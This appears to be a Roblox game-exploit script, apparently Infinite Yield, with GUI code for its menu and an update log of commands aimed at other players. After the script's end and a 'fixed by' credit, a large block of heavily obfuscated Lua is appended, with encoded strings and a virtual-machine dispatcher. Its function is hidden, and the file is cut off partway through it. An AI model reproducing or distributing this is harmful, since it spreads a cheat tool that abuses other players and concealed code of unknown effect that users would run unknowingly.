	local Index,SizeY = 0,0
	for i,v in next, frame2:GetChildren() do
		if bool then
			if Match2(v.Text,str) then
				game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 200),"Out","Quad",0.3,true)
				Index = Index + 1
				v.Position = UDim2.new(0,0,0,Index*v.AbsoluteSize.Y-v.AbsoluteSize.Y)
				v.Visible = true
				SizeY = SizeY + v.AbsoluteSize.Y
				frame2.CanvasSize = UDim2.new(0,0,0,SizeY) else v.Visible = false end else
			v.Visible = true
			SizeY = SizeY + v.AbsoluteSize.Y
			frame2.CanvasSize = UDim2.new(0,0,0,SizeY) end end end end end
IndexContents2('',true)
game.CoreGui.sugg.suggestions:TweenSize(UDim2.new(0, 300, 0, 0),"Out","Quad",0.2,true)
Loading.ba:TweenSize(UDim2.new(1, 0, 1, 0), "InOut", "Quart", 0.4, true, nil) wait(1)
repeat wait() until loadedintro == true
logof:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0), "Out", "Linear", 0.1)
wait(0.2)
f:TweenSizeAndPosition(UDim2.new(0,0,0,0),UDim2.new(0.5,0,0.5,0), "Out", "Linear", 0.2)
wait(0.3) g:Destroy()
updatecolors(Color3.new(colorR, colorG, colorB))
Loading:TweenPosition(UDim2.new(0.25, 0, 1.5, 0), "InOut", "Quart", 0.5, true, nil) wait(0.5) Loading.Parent:Destroy()
coroutine.resume(coroutine.create(function()
	local TextChatService = game:GetService("TextChatService")
	print("[IY-DEBUG] ChatVersion =", TextChatService.ChatVersion)
	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		local channels = TextChatService:FindFirstChild("TextChannels")
		local channel = channels and channels:FindFirstChild("RBXGeneral")
		print("[IY-DEBUG] channel =", channel)
		if channel then
			channel:DisplaySystemMessage("The prefix is '" .. cmdprefix .. "'")
			task.wait(0.5)
			channel:DisplaySystemMessage("Click IY on the top left to see more options")
			print("[IY-DEBUG] messages sent")
		end
	else
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "The prefix is '" .. cmdprefix .. "'";
			Color = Color3.new(255,255,255);
			Font = Enum.Font.SourceSans;
			FontSize = Enum.FontSize.Size24;
		}) wait(0.5)
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "Click IY on the top left to see more options";
			Color = Color3.new(255,255,255);
			Font = Enum.Font.SourceSans;
			FontSize = Enum.FontSize.Size24;
		})
	end
end))
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
qopen = false quickmenu.MouseButton1Click:connect(function()
if qopen == false then fadelock('off') NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil)
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01) MusicPlayer:Hide()
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, 0), "InOut", "Quart", 0.5, true, nil) wait(0.01) qopen = true else
quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
if slock == true then fadelock("rbxassetid://1495252742") elseif isagelocked == true then fadelock("rbxassetid://1495252495") end
qopen = false if playerenabled == true then MusicPlayer:Show() else NOTIFY.NOTIFY:TweenPosition(UDim2.new(0, 0, 0, -38), "InOut", "Quart", 0.5, true, nil) end end end)
quickmenu.sheild.cmds.MouseButton1Click:connect(function() if cmdOpen == true then
game.CoreGui.cp.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,0,1.018,-310),"Out","Quad",0.2,true) wait(0.1)
game.CoreGui.cp.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-300),"Out","Quad",0.2,true) wait(0.2)
game.CoreGui.cp.Frame.holder.bar.Hide.Visible = true
game.CoreGui.cp.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true)
else runwindow() end end)
quickmenu.sheild.settings.MouseButton1Click:connect(function() hub() end)
infopen = false quickmenu.sheild.info.MouseButton1Click:connect(function() if infopen == false then infopen = true
Updates = Instance.new("ScreenGui")
dragg = Instance.new("Frame")
local PromptDialog = Instance.new("Frame")
local ContainerFrame = Instance.new("Frame")
local LOG = Instance.new("TextLabel")
local PopupText3 = Instance.new("TextLabel")
local PopupText4 = Instance.new("TextLabel")
local UTDV = Instance.new("TextLabel")
local PopupText5 = Instance.new("TextLabel")
local shadow = Instance.new("Frame")
Exitt = Instance.new("TextButton")
local PopupText = Instance.new("TextLabel")
local vers = Instance.new("TextLabel")
Updates.Name = "Updates"
Updates.Parent = game.CoreGui
dragg.Name = "drag"
dragg.Parent = Updates
dragg.Active = true
dragg.BackgroundColor3 = Color3.new(1, 1, 1)
dragg.BackgroundTransparency = 1
dragGUI(dragg)
dragg.Position = UDim2.new(0.5, -225, 0, -600)
dragg.Size = UDim2.new(0, 438, 0, 26)
PromptDialog.Name = "PromptDialog"
PromptDialog.Parent = dragg
PromptDialog.BackgroundColor3 = Color3.new(0, 0, 0)
PromptDialog.BackgroundTransparency = 1
PromptDialog.BorderSizePixel = 0
PromptDialog.Position = UDim2.new(0, 0, 0, -2)
PromptDialog.Size = UDim2.new(0, 438, 0, 300)
PromptDialog.ZIndex = 5
ContainerFrame.Name = "ContainerFrame"
ContainerFrame.Parent = PromptDialog
ContainerFrame.BackgroundColor3 = maincolor
ContainerFrame.BackgroundTransparency = 0.5
ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
ContainerFrame.BorderSizePixel = 0
ContainerFrame.Position = UDim2.new(0, 0, 0, 29)
ContainerFrame.Size = UDim2.new(1, 0, 0.8, 0) -- SIZE
ContainerFrame.ZIndex = 5
LOG.Name = "LOG"
LOG.Parent = ContainerFrame
LOG.BackgroundTransparency = 1
LOG.Position = UDim2.new(0, 8, 0, 110)
LOG.Size = UDim2.new(1, -16, 1, 0)
LOG.ZIndex = 10
LOG.Font = Enum.Font.SourceSansBold
LOG.TextSize = 20
LOG.Text = "+ Added os [plr]\n+ Added whiteify/blackify [plr]\n+ Added addban [full username]\n+ Added a rainbow mode to the UI (inside color picker)\n\n* Fixed a bug in kidnap"
LOG.TextColor3 = Color3.new(0.97, 0.97, 0.97)
LOG.TextStrokeTransparency = 0
LOG.TextWrapped = true
LOG.TextYAlignment = Enum.TextYAlignment.Top
LOG.TextXAlignment = "Left"
PopupText3.Name = "PopupText3"
PopupText3.Parent = ContainerFrame
PopupText3.BackgroundTransparency = 1
PopupText3.Position = UDim2.new(0, 8, 0, 35)
PopupText3.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText3.ZIndex = 10
PopupText3.Font = Enum.Font.SourceSansBold
PopupText3.TextSize = 20
PopupText3.Text = "Edge - Moon"
PopupText3.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText3.TextStrokeTransparency = 0
PopupText3.TextWrapped = true
PopupText3.TextYAlignment = Enum.TextYAlignment.Top
PopupText4.Name = "PopupText4"
PopupText4.Parent = ContainerFrame
PopupText4.BackgroundTransparency = 1
PopupText4.Position = UDim2.new(0, 8, 0, 50)
PopupText4.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText4.ZIndex = 10
PopupText4.Font = Enum.Font.SourceSansBold
PopupText4.FontSize = Enum.FontSize.Size18
PopupText4.Text = "infyield.weebly.com - discord.me/infiniteyield"
PopupText4.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText4.TextStrokeTransparency = 0
PopupText4.TextWrapped = true
PopupText4.TextYAlignment = Enum.TextYAlignment.Top
UTDV.Name = "UTDV"
UTDV.Parent = ContainerFrame
UTDV.BackgroundTransparency = 1
UTDV.Position = UDim2.new(0, 8, 0, 5)
UTDV.Size = UDim2.new(1, -16, 0.100000001, 0)
UTDV.ZIndex = 10
UTDV.Font = Enum.Font.SourceSansBold
UTDV.FontSize = Enum.FontSize.Size28
UTDV.Text = "Up to date version: N/A"
UTDV.TextColor3 = Color3.new(0.97, 0.97, 0.97)
UTDV.TextStrokeTransparency = 0
UTDV.TextWrapped = true
UTDV.TextYAlignment = Enum.TextYAlignment.Top
PopupText5.Name = "PopupText5"
PopupText5.Parent = ContainerFrame
PopupText5.BackgroundTransparency = 1
PopupText5.Position = UDim2.new(0, 8, 0, 75)
PopupText5.Size = UDim2.new(1, -16, 0.100000001, 0)
PopupText5.ZIndex = 10
PopupText5.Font = Enum.Font.SourceSansBold
PopupText5.FontSize = Enum.FontSize.Size28
PopupText5.Text = "Update Log:"
PopupText5.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText5.TextStrokeTransparency = 0
PopupText5.TextWrapped = true
PopupText5.TextYAlignment = Enum.TextYAlignment.Top
shadow.Name = "shadow"
shadow.Parent = PromptDialog
shadow.BackgroundColor3 = maincolor
shadow.BackgroundTransparency = 0.30000001192093
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 438, 0, 26)
Exitt.Name = "Exit"
Exitt.Parent = shadow
Exitt.BackgroundColor3 = Color3.new(1, 0, 0)
Exitt.BackgroundTransparency = 0.30000001192093
Exitt.BorderColor3 = Color3.new(1, 0, 0)
Exitt.BorderSizePixel = 0
Exitt.Position = UDim2.new(0, 415, 0, 3)
Exitt.Size = UDim2.new(0, 20, 0, 20)
Exitt.FontSize = Enum.FontSize.Size14
Exitt.Text = ""
PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 61, 0, -2)
PopupText.Size = UDim2.new(0.760273993, -16, 1.15384614, 0)
PopupText.ZIndex = 110
PopupText.Font = Enum.Font.SourceSansBold
PopupText.TextSize = 30
PopupText.Text = "Information"
PopupText.TextColor3 = Color3.new(0.97, 0.97, 0.97)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true
PopupText.TextYAlignment = Enum.TextYAlignment.Top
vers.Name = "vers"
vers.Parent = shadow
vers.BackgroundTransparency = 1
vers.Position = UDim2.new(0, 8, 0, 2)
vers.Size = UDim2.new(0.200913236, -16, 1.11538458, 0)
vers.ZIndex = 110
vers.Font = Enum.Font.SourceSansBold
vers.TextSize = 20
vers.Text = "v" .. Version
vers.TextColor3 = Color3.new(0.97, 0.97, 0.97)
vers.TextStrokeTransparency = 0
vers.TextWrapped = true
vers.TextXAlignment = Enum.TextXAlignment.Left
vers.TextYAlignment = Enum.TextYAlignment.Top
if UTD == true then UTDV.Text = "Up to date version: Yes" else UTDV.Text = "Up to date version: No" end end
dragg:TweenPosition(UDim2.new(0.5, -225, 0, 100), "InOut", "Quart", 0.5, true, nil) Exitt.MouseButton1Click:connect(function()
dragg:TweenPosition(UDim2.new(0.5, -225, 0, -600), "InOut", "Quart", 0.5, true, nil) wait(0.5) infopen = false Updates:Destroy() end) end)
quickmenu.sheild.updates.MouseButton1Click:connect(function() serverinfogui() end) end

run()
--script end
end

run()
print("fixed by BLOX_FRUIT01110")
return(function(...)local v={"eHCD=#k)%NWV100P","e-_C$V","e[?\'n";"e<gd$";"eIlh!oHD@idP\\d\'f1$B";"eMr\"tG","eS!$l";"e@rFP","en(M*+T,f","ej/Vt[8m0r4P0_n\\IU";"eH%su\\k+";"e2A61g2BI","e-_C$V$9,N&[rE+8";"e[?)*Ys0!","eP>S","e\\,?9*Ih#o72;u>#mF";"eW?dINYX,0";"eH4)PLk+","ekKRWAslF","ec?cpP\"O\\a","e2)>5\\2di,_9jI!","e$nt*Q","ek>\\?(*qP","e-5_U&dHRgGdJi8";"ek(BB.Pf","ek>\\1#H%/\"","eG[\'(i%@@bJ";"e^JiY>]XTP","e[*gQ*eKo";"em6BXAds,l<B6@+$[kG","em0;^[I6M80mlI:R";"ep\"6T2H%sO]2\":";"e2\"fYe";"eFXVE:,5m$VHb.d","e$Qe";"e[sZ#-k>%kL","e2n^bE";"eQNl#`F>oo";"eB(\\+rH%H7fH%\',7[PMU(";"e6$*PIGg\\3Fq6S,/","eE)>\\7";"e$ntSf[P-8a2\'l%";"eP>%l\"j`j;mB6+CLsEg";"e^+","ej0r`c*ai.W*AbrZ1W";"e$nt/>HpfU";"e-1`^)";"es*?93s*D>1kEGNGsU","eY`<\'d[3&qp1AZ%\\","e\"4si0DYc0";"ei(?@]f_X";"e6I0-Y6V,ED*978$PE:";"e[$A*gY!";"e[PH+gH6";"eslS","e-D#nu","e[sZ!:s]pbO","e-#/Lc2\"S";"ej*K)GkrHVMpI;\"F","e[R)`E2\"U";"ej4g";"e2.nqYHoMjE";"eVEe#,gWbq[#MMu[!oKY=e;","es]]Xa";"eb>n4L%-2KY-F=SEk!:Lp;.Oe1IPn9Q)s=ju5f;Y\\HQ]IP#3!l!.p6pllU7^e\\mA%#Gh&ip9n*gR!H_I8a;\"Lqk5BF`%t)<%9.&B6>p+3D-/=I%;L\\N5\"jl5S3iM1]LFf#sR\',Qmpun7X]._*0c`k?,\":","e","em740<","ed)0I%LP?r","e*sTg";"e$nt\'=s$","eIi`T96W","eP>>";"e:8Dn>]?*%!\'P@D)H\\&Fj","e2_]\"a-`[Lpdkn","eT!q8>i1^","e.rc0.@SWQm(4W^76qE*Rn9S`";"eVX$<cP]\"h`dNK<:";"eVZ0/=pIiQGHpS";"ejo06A8/H4^:aROp";"e@%UN";"e\\GR\\i","egb99`c$/","e[L,6jH%\'2!2Y[qK","e*A!F6V7LoddH<bG","eB(\\UN1YD2npZ(nu"}local function S(S)return v[S+(-929647-(-935037))]end for S,P in ipairs({{-611506-(-611507);448390706%9150829},{-571378+571379;105136-105059},{3741%3663,-256360+256445}})do while P[210856-210855]<P[-123748+123750]do v[P[1759109833%11573091]],v[P[705974+-705972]],P[488815+-488814],P[225831+-225829]=v[P[-141538-(-141540)]],v[P[277195171%2639954]],P[262825-262824]+(954046+-954045),P[1157795642%8576264]-(-895420+895421)end end do local S=string.sub local P=string.len local W={C=736873-736823,["\\"]=2013347715%12989340,J=1083546940%15703578;G=371677-371628,B=481555977%2534505;["`"]=404333+-404319,i=-972156-(-972222);["."]=373432-373356;V=140772+-140749,["+"]=547879-547825,["6"]=-802578-(-802617),["("]=226865-226855;["*"]=-495087+495125,["0"]=499631+-499590;o=-160+231,k=312938+-312902,a=524343520%6026937;S=-1003263+1003319,p=24609+-24587;e=-188124-(-188198),Q=374944-374892,[")"]=63018924%15754729;D=362590533%13945789,n=-1056+1111;["^"]=585778+-585760,d=805305+-805277,L=-291554-(-291561);M=665589+-665521;["?"]=4201-4192,K=-1022464-(-1022528);["7"]=-782136+782213,[","]=549595-549553,[">"]=-936508-(-936573);X=134500+-134454;["%"]=243304+-243253;["]"]=517565-517552;P=495212730%4903096;H=602067-602035;b=-662511-(-662517),["8"]=3713604140%15219689;m=1909780721%10158408,["<"]=655604+-655531,Z=1115142015%10230660;["-"]=2025877929%16470552,["="]=-401137-(-401196);F=-723062+723064;["5"]=-233895+233940,N=159781+-159720,f=105379+-105319;_=398994886%1648739,E=102949988%1106989;["1"]=217320717%6036686,W=847482+-847410,["&"]=205297318%3732677,["2"]=639635-639604;q=-221735+221739,Y=-597274-(-597299);l=935170-935101,h=-345503-(-345515);u=1472652550%7670065,["/"]=471306562%6369007;["["]=985279+-985242,["@"]=125924+-125881;["9"]=-407405+407462,["\'"]=-146725+146778,I=-701622+701648,T=-180067-(-180134);g=96336879%550496,R=-319402+319465;["\""]=407789+-407709;["!"]=3060078180%12490115,O=944335-944253;j=70434+-70418,["$"]=-589810+589840;A=2311342873%13840376,U=693065-692981;["3"]=-290345+290348;[":"]=907179393%4984502,s=-576207-(-576242);c=513712+-513712;["#"]=-902460+902480,r=685429+-685367,["4"]=914966318%15775280;[";"]=-606515+606562,t=691317+-691277}local h=table.insert local d={v=486659081%2317424;r=-228583+228615,J=-111971+111995,["4"]=3313545394%14597116,s=-744183+744211,i=923925322%7635746;["7"]=553789009%13185452;["3"]=221967-221927,R=281554686%2025573;E=-38817+38822,U=1401805582%12628879,z=-586482+586539,X=552881+-552826;k=65676871%597062,W=1077832101%9372453,L=621713-621683,S=-624819+624882;P=-962494+962548,t=874961206%14343626;["0"]=684085+-684033,["1"]=2106542519%12614027,g=-35745+35794,y=1400375700%16096272;F=2591252946%14723028,p=1799684225%12497807,G=1799515947%8142606,["6"]=286372646%6093034;q=-835898+835945;b=716887342%6180063;d=97123+-97115,["9"]=812552202%4368560;O=4397011%75810;h=-678645+678698,N=408045+-408029;n=682293+-682232;["/"]=31822-31777,I=994815+-994756;x=554419846%2772099;V=1025059392%4051618,["5"]=1152347051%13245368;Z=940613180%7709944,w=-841899-(-841914);c=-527600+527660;M=239724587%14101445,D=41203430%1962067,H=4189755404%16495100;["2"]=3600501873%15002091;K=900668+-900649;o=-578054-(-578098),T=772728+-772702;a=257384+-257357,f=-368299+368306;["+"]=1599122800%6295759,["8"]=1084646073%5769394;l=-740178-(-740215);e=-850632-(-850682),u=716790-716790;B=1194008439%14047158,m=2893122499%13519264,Q=-805596-(-805625),Y=3373657024%13883362;C=1023232+-1023221,j=254440+-254397,A=182565710%1285674}local Z=string.char local C=table.concat local Y=type local U=v local Q=math.floor for v=998455139%13492637,#U,-489903+489904 do local I=U[v]if Y(I)=="string"then local Y=S(I,250728+-250727,325912868%7579369)if Y=="-"then I=S(I,219131034%898078)local W=P(I)local Y={}local V=-570418+570419 local y=349212580%8517380 local T=1686909269%8476931 while V<=W do local v=S(I,V,V)local P=d[v]if P then y=y+P*((170172592%3545261)^((3346080771%16647168-T)))T=T+(422190-422189)if T==-167393-(-167397)then T=1800496960%10978640 local v=Q(y/(-115364+180900))local S=Q((y%(-693365+758901))/(-162597-(-162853)))local P=y%(676694223%4481417)h(Y,Z(v,S,P))y=-1025856+1025856 end elseif v=="="then h(Y,Z(Q(y/(283341707%9137941))))if V>=W or S(I,V+2095723245%9885487,V+(542577+-542576))~="="then h(Y,Z(Q((y%(999428182%6531782))/(998271-998015))))end break end V=V+(-547248-(-547249))end U[v]=C(Y)elseif Y=="e"then I=S(I,1451494890%13693348)local d=P(I)local Y={}local V=1302459359%9172249 while V<=d do local v=(d-V)+(-934524-(-934525))local P=v>=493564538%6409929 and 2954264581%16596992 or v local C=224895888%1147428 local U=P>361899+-361898 for v=-941565-(-941565),13664+-13660,738935+-738934 do local h if v<P then local P=S(I,V+v,V+v)h=W[P]if not h then U=false break end else h=43988281%3998927 end C=C*(595601585%11453875)+h end if U then local v=Q(C/(-90915+16868131))%(375759679%3211619)local S=Q(C/(-610741-(-676277)))%(65826+-65570)local W=Q(C/(-397484-(-397740)))%(322151061%3881335)local d=C%(53883764%1924411)if P==-44764-(-44769)then h(Y,Z(v,S,W,d))elseif P==-343719-(-343723)then h(Y,Z(v,S,W))elseif P==-246888+246891 then h(Y,Z(v,S))elseif P==48484-48482 then h(Y,Z(v))end end V=V+P end U[v]=C(Y)end end end end return(function(d,v,Z,W,h,C,Y,i,K,O,T,V,g,Q,y,u,R,I,P,U)I,V,g,K,u,O,U,Q,y,R,T,P,i=function()V=V+494876201%2827864 Q[V]=3879440419%15770083 return V end,971070-971070,function(v,S)local W=y(S)local h=function(h,d,Z,C)return P(v,{h;d;Z,C},S,W)end return h end,function(v,S)local W=y(S)local h=function(...)return P(v,{...},S,W)end return h end,function(v,S)local W=y(S)local h=function(h,d,Z)return P(v,{h;d,Z},S,W)end return h end,function(v,S)local W=y(S)local h=function()return P(v,{},S,W)end return h end,{},{},function(v)for S=3174010756%12447101,#v,317226+-317225 do Q[v[S]]=Q[v[S]]+926973721%7724781 end if h then local P=h(true)local W=Z(P)W[S(89531-94883)],W[S(497519+-502895)],W[S(216615+-221943)]=v,T,function()return-338090+-723703 end return P else return d({},{[S(1030400+-1035776)]=T,[S(-337746-(-332394))]=v,[S(-524672-(-519344))]=function()return-546097+-515696 end})end end,function(v)Q[v]=Q[v]-(-920253+920254)if Q[v]==396652-396652 then Q[v],U[v]=nil,nil end end,function(v)local S,P=466606+-466605,v[-1047168+1047169]while P do Q[P],S=Q[P]-1296130115%5735089,S+182828026%4062845 if Q[P]==-499247-(-499247)then Q[P],U[P]=nil,nil end P=v[S]end end,function(P,h,d,Z)local n,E,L,A,p,x,G,K,Y,j,z,D,m,s,c,F,Q,q,X,T,M,l,k,a,B,H,N,t,J,b,w,r,e,y,f,V while P do if P>760891872%10727496 then if P<13723267-24289 then if 591410+11593026>P then if P>2881182687%25856022 then if P>-715574+12055952 then if 12163732-633140>P then P,Y=v[S(-835514+830175)],{V}elseif 11773320-(-100579)>P then G=P s=U[V]P,F=s and 2072483657%14011820 or 6012362724%24503533,s else m,y=not B,y+K Y=T>=y Y=m and Y m=y>=T m=B and m Y=m or Y m=9035572-1038400 P=Y and m Y=-190886+13363512 P=P or Y end else if 3080661628%12736390>P then P=16921701-751735 elseif P<1197794589%17196558 then P=15700736-(-44769)elseif-91555+11347194>P then D,e=S(-610086-(-604723)),956030+34243744589333 x=v[D]q=U[V]P,Y,A=v[S(511984+-517298)],{},S(661935-667253)f=U[T]a=f(A,e)D=q[a]e,r=S(77976-83299),23252588911226-99811 y=x[D]D=U[K]f=U[V]a=U[T]A=a(e,r)q=f[A]x=D[q]D=311916350%8244476>3133760-(-323370)y[x]=D x=S(-761784+756411)D=i(2414175285%16687614,{j;V,T,B;m,K})T=R(T)V=R(V)m=R(m)B=R(B)j=R(j)y=v[x]x=y(D)K=R(K)else X,n=-143011-(-143012),114410-114404 G=U[j]s=G(X,n)n,G=S(618149-623475),S(204646+-209972)v[G]=s X=v[n]n=-629682-(-629684)G=X>n P=G and-1010367+13418554 or 971959843%18732093 end end else if P<1999476320%23394506 then if P<719906785%22888635 then P=2119748954%18792511>=1076651127%25928472 P=P and 419821+9178936 or 13668801-330794 elseif 10887341-150885>P then P,Y=v[S(865732-871099)],{}elseif-909116+11738503>P then P,Y=854330+2633008,6769390-(-951806)<5848659-346027 U[V]=Y else Y,P={},v[S(1027455-1032768)]end else if P<2453126396%17825057 then e=S(303147-308458)A=v[e]r=U[V]N,c=840506+9604912893879,S(525232+-530610)b=U[T]z=b(c,N)P=7551110-885179 e=r[z]a=A[e]q=a elseif P<2872656656%23648723 then P=U[d[610035+-610034]]j=S(418669+-423985)y=U[d[100835+-100833]]B=S(-486316-(-481007))T=U[d[27748-27745]]m,x,s=764792+27817203841466,677173+19818656985828,S(986982-992319)K=T(B,m)D=1420604259034-472495 V=y[K]f=S(917052+-922410)y=U[d[418605+-418601]]K=U[d[1462790450%5804724]]q=31011684760584-740151 B=U[d[-580658+580661]]m=B(j,x)T=K[m]B=U[d[977408-977406]]m=U[d[662561693%14403515]]x=S(-784248+778931)j=m(x,D)A,D=-1033728+10442458950653,S(-885755+880395)K=B[j]m=U[d[538609+-538607]]j=U[d[711990+-711987]]x=j(D,q)B=m[x]J=18154306671583-(-372268)x=U[d[410862458%1902141]]D=U[d[-587890+587893]]a,w=732727+2405254355593,S(200491-205798)q=D(f,a)a=S(410349+-415674)j=x[q]D=U[d[570482+-570480]]q=U[d[148008-148005]]f=q(a,A)a=34659296310774-(-2080)x=D[f]z,m,f=377132+19958247982959,{[j]=x},S(55093-60450)x=U[d[173313254%6189759]]D=U[d[-561518-(-561521)]]q=D(f,a)X,D=2.2639724557187e+014%901981099655,S(-206596-(-201254))j=x[q]e=S(26669-32033)x=v[D]L=912700+25352891002623 f=U[d[-819511-(-819513)]]G,D=633527092657-82787,S(-280671-(-275305))D=x[D]a=U[d[369963+-369960]]F=2626453467335-812857 A=a(e,F)q=f[A]F=S(819286-824634)D=D(x,q)a=U[d[2467481486%15817189]]A=U[d[-53154+53157]]e=A(F,G)b=S(-448489-(-443118))f=a[e]e=U[d[833018+-833016]]F=U[d[-599411+599414]]G=F(s,X)A=e[G]F=U[d[590877%590872]]l=S(739876-745207)X=U[d[157543-157541]]n=U[d[-536750-(-536753)]]r=n(b,z)s=X[r]r=U[d[-255266-(-255272)]]z=U[d[-831736-(-831738)]]c=U[d[-93603+93606]]N=c(l,J)J=641908+22803750389633 b=z[N]l=S(-184821-(-179494))n=r[b]z=U[d[-835256-(-835258)]]c=U[d[-937597+937600]]N=c(l,J)b=z[N]N=U[d[507504+-507498]]J=U[d[1012801-1012799]]M=U[d[-827511-(-827514)]]p,x=S(-517565-(-512176)),S(671149-676469)E=M(p,L)l=J[E]x=D[x]c=N[l]J=U[d[1490918042%16565756]]p,L=S(-952416-(-947069)),-197670+13547814237551 M=U[d[455224575%8925972]]E=M(p,L)l=J[E]E=S(198886+-204229)M=v[E]p=U[d[191775520%8717069]]k=229031+13374936101377 L=U[d[916860+-916857]]t=L(w,k)E=p[t]k=76339897822515%930974509264 J=M[E]w=S(-780280+774945)p=U[d[-876219+876221]]L=U[d[868641155%6786259]]t=L(w,k)E=p[t]M=J(E)N=l..M z=c..N r=b..z X=n..r G=s..X e=F..G a=A..e q={[f]=a}x=x(D,q)Q={[V]=y;[T]=K;[B]=m,[j]=x}Y=P(Q)P,Y=v[S(782840-788152)],{}else p=U[V]M,E=p,P P=p and-208358+8537316 or 13945418-260776 end end end else if P>2411828089%19663448 then if P<12704804-(-660596)then if P<13496253-566578 then P=702198+15979784~=1867569384%8934673 U[V]=P P=-128228+3615566 elseif P<13719747-652852 then P,Y=v[S(-205734+200413)],{}elseif P<457582+12797734 then P=959936681%13506461<=6435557-571954 m,K=P,S(490351+-495735)U[V]=P T=v[K]K=S(964158+-969498)y=T[K]K=I()T=I()U[T]=y y=g(6148746104%26098973,{})U[K]=y B=I()D=g(598899+8112535,{B})y=758025863%18545207<=537465911%17491479 U[B]=y x=S(-477295+471922)j=v[x]x=j(D)y,P=x,x and 164166537%6138043 or 3131783080%31168440 else P=13612032-713846 end else if 14024717-568946>P then y=U[d[-581618+581624]]V=y==Q Y,P=V,6052312-(-342251)elseif P<14225682-623987 then a=e+a f,r=A>=a,not n f=r and f r=a>=A r=n and r f=r or f r=832122+878522 P=f and r f=-574962+5055611 P=P or f else P,k=E,2180242040%16643069 U[V]=M w=U[z]t=w+k L=c[t]p=q+L L=175063628%1509167 E=p%L P,q=1027786435%6344386,E t=U[b]L=f+t t=366024892%10167351 p=L%t f=p end end else if P<4637264280%24213732 then if P<2482442995%13139089 then a=I()A=i(9577796-(-310762),{a,x,j,B})r,f,l={},{},nil U[a]=f e=I()K,z=nil,S(655476+-660828)f=I()U[f]=A A,D={},nil U[e]=A N,y,n=S(-221735+216379),nil,S(-748215+742900)A=v[n]c=U[e]b={[z]=c,[N]=l}n=A(r,b)U[V]=n A=g(593586+14560029,{e,a;m,x,j,f})U[T]=A B=R(B)m=R(m)q=nil q=S(-524528+519147)x=R(x)a=R(a)f=R(f)e=R(e)m=S(739575+-744917)j=R(j)f=-927101+30173066990401 B=v[m]j=U[V]x=U[T]D=x(q,f)q=839802+1226249745404 m=j[D]K=B[m]m=U[V]j=U[T]D=S(-363244-(-357867))x=j(D,q)B=m[x]y=K[B]K=I()x,f=S(318485-323818),S(806009+-811319)U[K]=y B=U[V]m=U[T]D=59443545061141%301743951023 j=m(x,D)y=B[j]D=S(-417645+412323)B=I()U[B]=y m=U[V]q=-590706+22052109407147 j=U[T]x=j(D,q)y=m[x]j=P m=I()D=P U[m]=y q=v[f]P,x=q and 4251196648%31613381 or 140011191%25521420,q elseif P<3726472069%17519383 then P=Y and-206758+6646378 or 7298558-(-902908)elseif P<11867466-(-538673)then P=D P,y=x and-1046784+2729779 or 379435-(-725494),x else X=S(919805+-925167)G=v[X]r=S(-354091+348708)n=v[r]X=G(n)G,P=S(1023986-1029312),681717+12194964 v[G]=X end else if P<11942860-(-667573)then P=U[d[345653-345643]]V=U[d[160432-160421]]Q[P]=V P=U[d[1012991+-1012979]]V={P(Q)}Y,P={W(V)},v[S(-416301+410946)]elseif 12038031-(-773368)>P then P=8264540-(-732599)s=q==f F=s else P=16403669-233703 end end end end else if P>-509616+15755138 then if P>3882681212%27422022 then if 4437680088%30491812>P then if-739511+16966310>P then V=U[d[-237092-(-237095)]]y=19247323%287273 Q=V%y 